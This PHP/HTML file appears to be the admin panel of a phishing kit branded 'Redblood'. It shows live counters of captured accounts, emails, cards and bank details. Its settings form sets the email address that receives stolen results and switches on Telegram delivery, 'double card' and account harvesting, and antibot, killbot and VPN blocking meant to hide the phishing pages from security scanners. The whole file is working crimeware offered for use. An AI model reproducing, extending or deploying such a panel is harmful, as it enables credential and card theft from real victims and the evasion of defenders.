<?php
defined("ALLOW") or exit('No direct script access allowed');
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Admin Panel | Redblood</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/img/favicon.ico" rel="icon">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&family=Roboto:wght@500;700&display=swap" rel="stylesheet"> 
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">
    <link rel="stylesheet" href="<?= base_url() ?>REDBLOOD/Assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i">
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css'>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.css">

    <!-- Libraries Stylesheet -->
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css" rel="stylesheet" />
 
    <!-- Customized Bootstrap Stylesheet -->
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/css/bootstrap.min.css" rel="stylesheet">

    <!-- Template Stylesheet -->
    <link href="<?= base_url() ?>REDBLOOD/Views/panel/css/fxc.css" rel="stylesheet">
</head>

<body>
    <script type="text/javascript">
        setInterval(function() {
            fetch('<?= base_url() ?>panel/json')
                .then(r => r.json())
                .then(data => {
                    console.log(data)
                    let logaccount = data.logaccount
                    let logemail = data.logemail
                    let Secure = data.Secure
                    let logcard = data.logcard
                    let logbank = data.logbank
                    let logclick = data.logclick
                    let logpap = data.logpap
                    let logrobot = data.logrobot

                    document.getElementById("logaccount").innerHTML = logaccount
                    document.getElementById("logemail").innerHTML = logemail
                    document.getElementById("Secure").innerHTML = Secure
                    document.getElementById("logcard").innerHTML = logcard
                    document.getElementById("logbank").innerHTML = logbank
                    document.getElementById("logclick").innerHTML = logclick
                    document.getElementById("logpap").innerHTML = logpap
                    document.getElementById("logrobot").innerHTML = logrobot
                });

            fetch('<?= base_url() ?>panel/logclick')
                .then(r => r.text())
                .then(data => {
                    console.log(data)
                    document.getElementById("tr").innerHTML = data
                })
        }, 1000);
    </script>
    <div class="container-fluid position-relative d-flex p-0">
        <div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
            <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
                <span class="sr-only">Loading...</span>
            </div>
        </div>
        <?php include "sidebar.php"; ?>
        <div class="content">
            <?php include "navbar.php"; ?>           
            <div class="container-fluid pt-4 px-4"> 
            </div>
            <!-- Sale & Revenue End -->
            <div class="col-md ">
                <div class="card">
                    <form method="post" action="<?= base_url() ?>security-check/panel/update">
                        <div class="card-header bg-primary">
                            <div class="card-title text-white"><i class="fa fa-list m-2"></i> CONFIGURATION</div>
                        </div>
                        <div class="card-body bg-dark">
                            <input type="text" class="form-control" name="token" placeholder="Enter Email" value="<?php echo _config('TOKEN'); ?>" hidden>
                            <div class="form-group">
                                <label class="text-warning" for="email"><i class="fa fa-envelope me-1 text-warning"></i> EMAIL RESULT</label>
                                <input style="background-color: rgb(214, 214, 214);" type="email" class="form-control" id="email" name="result" placeholder="Please enter a valid email" value="<?php echo _config('RESULT'); ?>">
                            </div>

                            <div class="form-group">
                                <label class="text-warning" for="parameter"><i class="fa fa-globe me-1"></i> SET PARAMETER</label>
                                <input style="background-color: rgb(214, 214, 214);" type="text" class="form-control" id="parameter" name="parameter" placeholder="Custom Your Paramater" value="<?php echo _config('PARAMETER'); ?>">

                                <div class="form-row mt-4">
                                    <div class="col-12 col-sm-4 mt-4 mt-sm-0">
                                        <label class="text-warning"><i class="fa fa-bug me-1"></i> BLOCKER FEATURE</label>
                                        <select name="rbtoken" class="form-control">
                                            <option <?php if (_config('RBTOKEN') == 'off') {
                                                        echo "selected=selected";
                                                    } ?> value="off">Off</option>
                                            <option <?php if (_config('RBTOKEN') == 'on') {
                                                        echo "selected=selected";
                                                    } ?> value="on">On</option>
                                        </select>
                                    </div>
                                    <div class="col-6 col-sm-4 mt-4 mt-sm-0">
                                        <label class="text-warning"><i class="fa fa-bug me-1"></i> ANTIBOT FEATURE</label>
                                        <select name="antibot" class="form-control">
                                            <option <?php if (_config('ANTIBOT') == 'off') {
                                                        echo "selected=selected";
                                                    } ?> value="off">Off</option>
                                            <option <?php if (_config('ANTIBOT') == 'on') {
                                                        echo "selected=selected";
                                                    } ?> value="on">On</option>
                                        </select>
                                    </div>
                                    <div class="col-6 col-sm-4 mt-4 mt-sm-0">
                                        <label class="text-warning"><i class="fa fa-bug me-1"></i> KILLBOT FEATURE</label>
                                        <select name="killbot" class="form-control">
                                            <option <?php if (_config('KILLBOT') == 'off') {
                                                        echo "selected=selected";
                                                    } ?> value="off">Off</option>
                                            <option <?php if (_config('KILLBOT') == 'on') {
                                                        echo "selected=selected";
                                                    } ?> value="on">On</option>
                                        </select>
                                    </div>
                                </div>
                                <div class="form-row mt-4">
                                    <div class="col-12 col-sm-3 mt-4 mt-sm-0">
                                        <label class="text-warning"><i class="fa fa-user-plus me-1"></i> GET ACCOUNT</label>
                                        <select name="getaccount" class="multisteps-form__select form-control">
                                            <option <?php if (_config('GETACCOUNT') == 'off') {
                                                        echo "selected=selected";
                                                    } ?> value="off">Off</option>
                                            <option <?php if (_config('GETACCOUNT') == 'on') {
                                                        echo "selected=selected";
                                                    } ?> value="on">On</option>
                                        </select>
                                    </div>
                                    <div class="col-6 col-sm-3 mt-4 mt-sm-0">
                                        <label class="text-warning"><i class="fa fa-ghost me-1"></i> BLOCK VPN</label>
                                        <select name="vpndetect" class="multisteps-form__select form-control">
                                            <option <?php if (_config('VPNDETECT') == 'off') {
                                                        echo "selected=selected";
                                                    } ?> value="off">Off</option>
                                            <option <?php if (_config('VPNDETECT') == 'on') {
                                                        echo "selected=selected";
                                                    } ?> value="on">On</option>
                                        </select>
                                    </div>
                                    <div class="col-6 col-sm-3 mt-4 mt-sm-0">
                                        <label class="text-warning"><i class="fa fa-credit-card me-1"></i> DOUBLE CARD</label>
                                        <select name="doublecard" class="multisteps-form__select form-control">
                                            <option <?php if (_config('DOUBLECARD') == 'off') {
                                                        echo "selected=selected";
                                                    } ?> value="off">Off</option>
                                            <option <?php if (_config('DOUBLECARD') == 'on') {
                                                        echo "selected=selected";
                                                    } ?> value="on">On</option>
                                        </select>
                                    </div>
                                              <div class="col-6 col-sm-3 mt-4 mt-sm-0">
                                        <label class="text-warning"><i class="fab fa-telegram me-1"></i> TELEGRAM</label>
                                        <select name="telegram" class="multisteps-form__select form-control">
                                            <option <?php if (_config('TELEGRAM') == 'off') {
                                                        echo "selected=selected";
                                                    } ?> value="off">Off</option>
                                            <option <?php if (_config('TELEGRAM') == 'on') {
                                                        echo "selected=selected";
                                                    } ?> value="on">On</option>
                                        </select>
                                    </div>
                                </div>
                                <br>
                                <br>
                                <div class="text-center">
                                    <button style="text-align: center;" class="btn btn-primary" name="updatesetting"><i class="fa fa-check m-2"></i> CONFIRM</button>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
            <!-- Footer Start -->
            <div class="container-fluid pt-4 px-4">
                <div class="bg-secondary rounded-top p-4">
                    <div class="row">
                        <div class="col-12 col-sm-6 text-center text-sm-start">
                            &copy; <a href="#">2024 Redblood</a> All Right Reserved. 
                        </div>
                        <div class="col-12 col-sm-6 text-center text-sm-end">
                            Made with <i class="fa fa-heart text-primary"></i> By <a href="#">Redblood</a>
                        </div>
                    </div>
                </div>
            </div>           
        </div>
    </div>

    <!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/chart/chart.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/easing/easing.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/waypoints/waypoints.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/owlcarousel/owl.carousel.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/tempusdominus/js/moment.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/tempusdominus/js/moment-timezone.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Views/panel/lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js"></script>
    
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/core/jquery.3.2.1.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/jquery-ui-1.12.1.custom/jquery-ui.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/core/popper.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/core/bootstrap.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/chartist/chartist.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/chartist/plugin/chartist-plugin-tooltip.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/bootstrap-toggle/bootstrap-toggle.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/jquery-mapael/jquery.mapael.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/jquery-mapael/maps/world_countries.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/chart-circle/circles.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/plugin/jquery-scrollbar/jquery.scrollbar.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/ready.min.js"></script>
    <script src="<?= base_url() ?>REDBLOOD/Assets/js/demo.js"></script>

    <script src="<?= base_url() ?>REDBLOOD/Views/panel/js/main.js"></script>
    
</body>
<?php if (@$_SESSION['sukses']) { ?>

    <?php echo $_SESSION['sukses']; ?>
</script>
<?php unset($_SESSION['sukses']);
} ?>

</html>